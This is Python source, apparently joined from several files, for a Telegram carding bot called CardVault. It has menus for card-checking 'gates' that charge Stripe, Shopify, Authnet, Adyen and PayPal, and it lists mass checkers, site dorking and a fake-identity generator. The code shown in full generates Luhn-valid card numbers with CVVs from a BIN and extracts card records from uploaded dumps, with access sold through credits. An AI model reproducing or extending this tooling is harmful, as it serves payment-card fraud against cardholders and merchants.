        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 : <i>Shopify</i>\n"
        "✦═════════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def shopify10_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Shopify 10$' button."""
    q = update.callback_query
    await q.answer()
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 10$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   : <code>/hc</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$10</i>\n"
        "✦═══════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Authnet 1.0$' button."""
    q = update.callback_query
    await q.answer()
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐀𝐮𝐭𝐡𝐍𝐞𝐭 1$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   : <code>/at</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Authnet</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1.0</i>\n"
        "✦══════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )




async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Stripe 1$' button."""
    q = update.callback_query
    await q.answer()
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐒𝐭𝐫𝐢𝐩𝐞 1$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   : <code>/st</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Stripe</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1</i>\n"
        "✦══════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def stripe3_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Stripe 3$' button."""
    q = update.callback_query
    await q.answer()
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐒𝐭𝐫𝐢𝐩𝐞 3$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   : <code>/st1</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Stripe</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$3</i>\n"
        "✦════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the '3DS Lookup' button."""
    q = update.callback_query
    await q.answer()
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "🔎━━ 𝟑𝐃𝐒 𝐋𝐨𝐨𝐤 𝐔𝐏 ━━💳\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   : <code>/vbv &lt;card|mm|yy|cvv&gt;</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>3DS / VBV</i>\n"
        "✦═════════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles all inline button callback queries and routes them to the
    appropriate handler function.
    """
    q = update.callback_query
    await q.answer()
    data = q.data

    # Map callback data to the handler functions
    handlers = {
        "tools_menu": show_tools_menu,
        "gates_menu": gates_menu_handler,
        "auth_sub_menu": auth_sub_menu_handler,
        "charge_sub_menu": charge_sub_menu_handler,
        "shopify_gate": shopify_gate_handler,
        "autoshopify_gate": autoshopify_gate_handler,
        "stripe_gate": stripe_gate_handler,
        "stripe3_gate": stripe3_gate_handler,      # ✅ Stripe 3$
        "shopify10_gate": shopify10_gate_handler,
        "authnet36_gate": authnet36_gate_handler,
        "ocean_gate": ocean_gate_handler,          # ✅ Ocean Payments 4$
        "adyen_gate": adyen_gate_handler,          # ✅ Added Adyen 1$
        "paypal_gate": paypal_gate_handler, 
        "paypal1_gate": paypal1_gate_handler,
        "ds_lookup": ds_lookup_menu_handler,
        "back_to_start": back_to_start_handler,
    }

    handler = handlers.get(data)
    if handler:
        await handler(update, context)
    else:
        await q.answer("⚠️ Unknown option selected.", show_alert=True)



from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, CallbackQueryHandler, CommandHandler
from telegram.error import TelegramError
import logging
import html

# Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Invisible padding character
PAD_CHAR = "\u200A"
LINE_WIDTH = 69  # fixed width for all lines

def escape_html(text: str) -> str:
    return html.escape(text, quote=False)

# All commands - Type is always "Free/Premium"
ALL_COMMANDS = [
    ("Stripe 1$", "/st"),
    ("Stripe 3$", "/st1"),
    ("Single Stripe Auth", "/chk"),
    ("Braintree Premium Auth", "/b3"),
    ("Mass x30 Stripe Auth 2", "/mass"),
    ("Authnet 2.5$ Charge", "/at"),
    ("Adyen 1.0$ Charge", "/ad"),
    ("Paypal 1$", "/pp"),    
    ("Paypal Payments 9$", "/py"),
    ("Ocean Payments 4$", "/oc"),
    ("3DS Lookup", "/vbv"),
    ("Shopify Charge $0.98", "/sh"),
    ("Shopify Charge $10", "/hc"),
    ("Set your Shopify site", "/seturl"),
    ("Auto check on your site", "/sp"),
    ("Mass Shopify Charged", "/msp"),
    ("Check if Shopify site is live", "/site"),
    ("Mass Shopify site check", "/msite"),
    ("Check your added sites", "/mysites"),
    ("Set 20 Shopify sites", "/adurls"),
    ("Remove all added sites", "/removeall"),
    ("Remove specific sites", "/rsite"),
    ("Dork a query", "/dork"),
    ("Add your key to dork", "/adserp"),
    ("Remove you serp key", "/rserp"),
    ("Generate cards from BIN", "/gen"),
    ("Payment Gateway Checker", "/gate"),
    ("BIN lookup", "/bin"),
    ("Fake identity generator", "/fk"),
    ("Extract CCs from dumps", "/fl"),
    ("Extract cards from file", "/open"),
    ("Redeem a bot code", "/redeem"),
    ("Welcome message", "/start"),
    ("Show all commands", "/cmds"),
    ("Bot system status", "/status"),
    ("Check your remaining credits", "/credits"),
    ("Show your user info", "/info")
]

# Split into pages (4 commands per page)
PAGE_SIZE = 4
PAGES = [ALL_COMMANDS[i:i + PAGE_SIZE] for i in range(0, len(ALL_COMMANDS), PAGE_SIZE)]

def pad_line(label: str, value: str) -> str:
    return f"<b><i>{label}:</i></b> <i>{value}</i>"

def build_page_text(page_index: int) -> str:
    try:
        page_commands = PAGES[page_index]
        text = "━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"<i>◆ 𝐂𝐌𝐃𝐒 𝐏𝐀𝐆𝐄 {page_index + 1}/{len(PAGES)}</i>\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        for name, cmd in page_commands:
            text += pad_line("Name", escape_html(name)) + "\n"
            text += pad_line("Use", escape_html(cmd)) + "\n"
            text += pad_line("Status", "Online ✅") + "\n"
            text += pad_line("Type", "Free/Premium") + "\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        return text.strip()
    except Exception as e:
        logger.error(f"Error building page text: {e}")
        return "Error: Could not build page text."

def build_cmds_buttons(page_index: int) -> InlineKeyboardMarkup:
    buttons = []
    nav_buttons = []
    if page_index > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page_index - 1}"))
    if page_index < len(PAGES) - 1:
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"page_{page_index + 1}"))
    if nav_buttons:
        buttons.append(nav_buttons)
    buttons.append([InlineKeyboardButton("❌ Close", callback_data="close")])
    return InlineKeyboardMarkup(buttons)

# /cmds command handler
async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = build_page_text(0)
    buttons = build_cmds_buttons(0)
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=buttons
    )

# Pagination handler for /cmds buttons
async def cmds_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("page_"):
        try:
            page_index = int(data.split("_")[1])
            text = build_page_text(page_index)
            buttons = build_cmds_buttons(page_index)
            await query.message.edit_text(
                text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
        except TelegramError as e:
            logger.error(f"TelegramError: {e}")
        except Exception as e:
            logger.error(f"Error in pagination: {e}")

# Close button handler
async def handle_close(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.delete()






from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/CARDER33"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the user's detailed information."""
    user = update.effective_user
    user_data = await get_user(user.id)

    # Define the bullet point with the hyperlink (full [⌇] visible & clickable)
    bullet_text = "\[⌇\]"
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    # Escape all dynamic values
    first_name = escape_markdown_v2(user.first_name or 'N/A')
    user_id = escape_markdown_v2(str(user.id))
    username = escape_markdown_v2(user.username or 'N/A')
    status = escape_markdown_v2(user_data.get('status', 'N/A'))
    credits = escape_markdown_v2(str(user_data.get('credits', 0)))
    plan = escape_markdown_v2(user_data.get('plan', 'N/A'))
    plan_expiry = escape_markdown_v2(user_data.get('plan_expiry', 'N/A'))
    keys_redeemed = escape_markdown_v2(str(user_data.get('keys_redeemed', 0)))
    registered_at = escape_markdown_v2(user_data.get('registered_at', 'N/A'))

    info_message = (
        "🔍 *Your Info on 𝑪𝒂𝒓𝒅𝑽𝒂𝒖𝒍𝒕✘* ⚡\n"
        "━━━━━━━━━━━━━━\n"
        f"{bullet_link}  𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚: `{first_name}`\n"
        f"{bullet_link}  𝙄𝘿: `{user_id}`\n"
        f"{bullet_link}  𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n\n"
        f"{bullet_link}  𝙎𝙩𝙖𝙩𝙪𝙨: `{status}`\n"
        f"{bullet_link}  𝘾𝙧𝙚𝙙𝙞𝙩: `{credits}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣: `{plan}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: `{plan_expiry}`\n"
        f"{bullet_link}  𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: `{keys_redeemed}`\n"
        f"{bullet_link}  𝙍𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 𝘼𝙩: `{registered_at}`\n"
    )

    await update.message.reply_text(
        info_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )






from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown as escape_markdown_v2
import random, io
from datetime import datetime
from bin import get_bin_info  # Your BIN lookup function

# ===== /gen Command =====
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates cards from a given BIN/sequence."""
    
    user = update.effective_user
    
    # Enforce cooldown (assuming function defined)
    if not await enforce_cooldown(user.id, update):
        return
    
    # Get user data and check credits
    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Get input
    if context.args:
        raw_input = context.args[0]
    else:
        raw_input = None
    
    if not raw_input:
        return await update.effective_message.reply_text(
            escape_markdown_v2(
                "❌ Please provide BIN or sequence (at least 6 digits).\n"
                "Usage:\n`/gen 414740`\n`/gen 445769 20`\n`/gen 414740|11|2028|777`"
            ),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Split input parts
    parts = raw_input.split("|")
    card_base = parts[0].strip()
    extra_mm = parts[1].zfill(2) if len(parts) > 1 and parts[1].isdigit() else None
    extra_yyyy = parts[2] if len(parts) > 2 and parts[2].isdigit() else None
    extra_cvv = parts[3] if len(parts) > 3 and parts[3].isdigit() else None
    
    if not card_base.isdigit() or len(card_base) < 6:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ BIN/sequence must be at least 6 digits."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Determine number of cards
    num_cards = 10  # default
    send_as_file = False
    if len(context.args) > 1 and context.args[1].isdigit():
        num_cards = int(context.args[1])
        send_as_file = True
    
    # Consume 1 credit
    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # ==== Fetch BIN info ====
    try:
        bin_number = card_base[:6]
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "N/A"
        country_flag = bin_details.get("country_emoji", "")
        card_type = bin_details.get("type", "N/A")
        card_level = bin_details.get("level", "N/A")
        card_length = bin_details.get("length") or (15 if "amex" in brand.lower() else 16)
        luhn_check = "✅" if bin_details.get("luhn", True) else "❌"
        bank_phone = bin_details.get("bank_phone", "N/A")
        bank_url = bin_details.get("bank_url", "N/A")
    except Exception:
        brand = issuer = country_name = country_flag = card_type = card_level = bank_phone = bank_url = "N/A"
        card_length = 16
        luhn_check = "N/A"
    
    # ==== Generate cards ====
    cards = []
    attempts = 0
    max_attempts = num_cards * 100
    while len(cards) < num_cards and attempts < max_attempts:
        attempts += 1
        suffix_len = card_length - len(card_base)
        if suffix_len < 0:
            break
        
        card_number = card_base + ''.join(str(random.randint(0, 9)) for _ in range(suffix_len))
        if not luhn_checksum(card_number):
            continue
        
        mm = extra_mm or str(random.randint(1, 12)).zfill(2)
        yyyy = extra_yyyy or str(datetime.now().year + random.randint(1, 5))
        cvv = extra_cvv or (str(random.randint(0, 9999)).zfill(4) if card_length == 15 else str(random.randint(0, 999)).zfill(3))
        
        cards.append(f"{card_number}|{mm}|{yyyy[-2:]}|{cvv}")
    
    # ==== BIN info block in grey ====
    escaped_bin_info = (
        "```\n"
        f"BIN       ➳ {escape_markdown_v2(card_base)}\n"
        f"Brand     ➳ {escape_markdown_v2(brand)}\n"
        f"Type      ➳ {escape_markdown_v2(card_type)} | {escape_markdown_v2(card_level)}\n"
        f"Bank      ➳ {escape_markdown_v2(issuer)}\n"
        f"Country   ➳ {escape_markdown_v2(country_name)}\n"
        "```"
    )
    
    # ==== Send output ====
    if send_as_file:
        file_content = "\n".join(cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"generated_cards_{card_base}.txt"
        await update.effective_message.reply_document(
            document=file,
            caption=f"```\nGenerated {len(cards)} cards 💳\n```\n\n{escaped_bin_info}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        cards_list = "\n".join(f"`{c}`" for c in cards)
        final_message = (
            f"```\nGenerated {len(cards)} cards 💳\n```\n\n"
            f"{cards_list}\n\n"
            f"{escaped_bin_info}"
        )
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )








import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

# These are placeholder functions. You will need to define the actual
# logic for them elsewhere in your codebase.
async def get_user(user_id):
    """Placeholder function to retrieve user data, e.g., from a database."""
    # Returning dummy data for the purpose of a runnable example.
    return {
        'status': 'Active',
        'credits': 100,
        'plan': 'Free Tier',
        'plan_expiry': 'N/A',
        'keys_redeemed': 2,
        'registered_at': '2025-01-01'
    }

async def update_user(user_id, **kwargs):
    """Placeholder function to update user data, e.g., deducting credits."""
    print(f"User {user_id} updated with {kwargs}")
    return True

async def enforce_cooldown(user_id, update):
    """Placeholder function to enforce command cooldowns."""
    # You can implement your cooldown logic here.
    # For now, we will return True to allow the command to proceed.
    return True

async def open_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Extracts credit cards from an uploaded text file, or from a file
    in a replied-to message, with a maximum limit of 100 cards.
    A single credit is deducted per command use.
    """
    # The authorization check has been removed, so all users can access this command.

    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    # Fetch user data to check credits
    user_data = await get_user(user.id)
    # Check for at least 1 credit to run the command
    if not user_data or user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for a replied-to message with a document
    if update.effective_message.reply_to_message and update.effective_message.reply_to_message.document:
        document = update.effective_message.reply_to_message.document
    # Fallback to checking the current message for a document
    elif update.effective_message.document:
        document = update.effective_message.document
    else:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Please reply to a txt file with the command or attach a txt file with the command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check if the file is a text file
    if document.mime_type != 'text/plain':
        return await update.effective_message.reply_text(escape_markdown_v2("❌ The file must be a text file (.txt)."), parse_mode=ParseMode.MARKDOWN_V2)

    # Deduct a single credit for the command
    await update_user(user.id, credits=user_data['credits'] - 1)

    # Get the file and download its content
    try:
        file_obj = await document.get_file()
        file_content_bytes = await file_obj.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
    except Exception as e:
        return await update.effective_message.reply_text(escape_markdown_v2(f"❌ An error occurred while reading the file: {e}"), parse_mode=ParseMode.MARKDOWN_V2)

    # Regex to find credit card patterns
    card_pattern = re.compile(r'(\d{13,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    
    # Find all matches
    found_cards = card_pattern.findall(file_content)
    
    # Check if the number of cards exceeds the 100 limit
    if len(found_cards) > 100:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ The maximum number of cards allowed to open is 100. Please upload a smaller file."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not found_cards:
        return await update.effective_message.reply_text(escape_markdown_v2("❌ No valid cards were found in the file."), parse_mode=ParseMode.MARKDOWN_V2)

    # Format the output message with count and monospace
    cards_list = "\n".join([f"`{card}`" for card in found_cards])
    
    # Create the stylish box for the caption/message
    stylish_card_box = (
        f"💳 𝐂𝐀𝐑𝐃𝐕𝐀𝐔𝐋𝐓 𝐗 💳\n\n"
        f"╭━━━━━━━━━━━━━━━━━━⬣\n"
        f"┣ ❏ 𝐅𝐨𝐮𝐧𝐝 *{len(found_cards)}* 𝐂𝐚𝐫𝐝𝐬\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣\n"
    )
    
    # Combine the box and the list of cards
    final_message = f"{stylish_card_box}\n{cards_list}"
    
    # Check if the message is too long to be sent normally
    # A safe limit, as Telegram's is 4096
    if len(final_message) > 4000:
        file_content = "\n".join(found_cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"extracted_cards.txt"
        
        await update.effective_message.reply_document(
            document=file,
            caption=f"{stylish_card_box}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )


import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

async def adcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Adds a specified number of credits to a user's account, restricted to a specific owner."""
    # Owner ID is hardcoded
    OWNER_ID = 6701573974

    # Check if the user is the owner
    if update.effective_user.id != OWNER_ID:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You are not allowed to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for correct number of arguments
    if len(context.args) != 2:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Invalid command usage. Correct usage: /adcr [user_id] [no. of credits]"),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])
        credits_to_add = int(context.args[1])

        if credits_to_add <= 0:
            return await update.effective_message.reply_text(
                escape_markdown_v2("❌ The number of credits must be a positive integer."),
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Both the user ID and number of credits must be valid numbers."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Fetch the target user's data
    target_user_data = await get_user(user_id)

    if not target_user_data:
        return await update.effective_message.reply_text(
            escape_markdown_v2(f"❌ User with ID {user_id} not found in the database."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Update the user's credits
    new_credits = target_user_data.get('credits', 0) + credits_to_add
    await update_user(user_id, credits=new_credits)

    # Send a confirmation message with proper monospace formatting and escaping
    # The f-string is escaped here to handle the periods correctly.
    final_message = escape_markdown_v2(f"✅ Successfully added {credits_to_add} credits to user {user_id}. Their new credit balance is {new_credits}.")

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )


from telegram import Update
from telegram.ext import ContextTypes
from bin import get_bin_info  # Import your BIN fetching logic
import html

# ===== Config =====
BULLET_GROUP_LINK = "https://t.me/CARDER33"
DEVELOPER_NAME = "kคli liຖนxx"
DEVELOPER_LINK = "https://t.me/Kalinuxxx"

# ===== Utilities =====
def get_level_emoji(level: str) -> str:
    """Return a matching emoji for card level/category."""
    mapping = {
        "classic": "💳",
        "gold": "🥇",
        "platinum": "💠",
        "business": "🏢",
        "world": "🌍",
        "signature": "✍️",
        "infinite": "♾️"
    }
    return mapping.get(level.lower(), "💳")


def safe(field):
    """Return field or 'N/A' if None."""
    return field or "N/A"


# ===== /bin Command =====
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Performs a BIN lookup and shows full info using clickable bullets."""
    user = update.effective_user

    # Clickable bullet
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    # Parse BIN input
    bin_input = None
    if context.args:
        bin_input = context.args[0]
    elif update.effective_message and update.effective_message.text:
        parts = update.effective_message.text.split(maxsplit=1)
        if len(parts) > 1:
            bin_input = parts[1]

    if not bin_input or not bin_input.isdigit() or len(bin_input) < 6:
        return await update.effective_message.reply_text(
            "❌ Please provide a valid 6-digit BIN. Usage: /bin [bin]",
            parse_mode="HTML"
        )

    bin_number = bin_input[:6]

    try:
        # Fetch BIN info
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = safe(bin_details.get("bank"))
        country_name = safe(bin_details.get("country"))
        country_flag = bin_details.get("country_emoji", "")
        card_type = safe(bin_details.get("type"))
        card_level = safe(bin_details.get("brand"))
        card_length = safe(bin_details.get("length"))
        luhn_check = safe(bin_details.get("luhn"))
        bank_phone = safe(bin_details.get("bank_phone"))
        bank_url = safe(bin_details.get("bank_url"))

        level_emoji = get_level_emoji(card_level)

        # Build BIN info message
        bin_info_box = (
            f"✦━━━[ <b>𝐁𝐈𝐍 𝐈𝐍𝐅𝐎</b> ]━━━✦\n"
            f"{bullet_link} <b>BIN</b> ➳ <code>{bin_number}</code>\n"
            f"{bullet_link} <b>Scheme</b> ➳ <code>{html.escape(brand)}</code>\n"
            f"{bullet_link} <b>Type</b> ➳ <code>{html.escape(card_type)}</code>\n"
            f"{bullet_link} <b>Brand</b> ➳ {level_emoji} <code>{html.escape(card_level)}</code>\n"
            f"{bullet_link} <b>Issuer/Bank</b> ➳ <code>{html.escape(issuer)}</code>\n"
            f"{bullet_link} <b>Country</b> ➳ <code>{html.escape(country_name)} {country_flag}</code>\n"
            f"{bullet_link} <b>Requested By</b> ➳ {user.mention_html()}\n"
            f"{bullet_link} <b>Bot By</b> ➳ {developer_clickable}\n"
        )

        # Send BIN info
        await update.effective_message.reply_text(
            bin_info_box,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ Error fetching BIN info: {html.escape(str(e))}",
            parse_mode="HTML"
        )










from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/CARDER33"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /credits command, showing user info and credits."""
    user = update.effective_user
    user_data = await get_user(user.id)

    # Make the bullet [⌇] fully clickable and visible
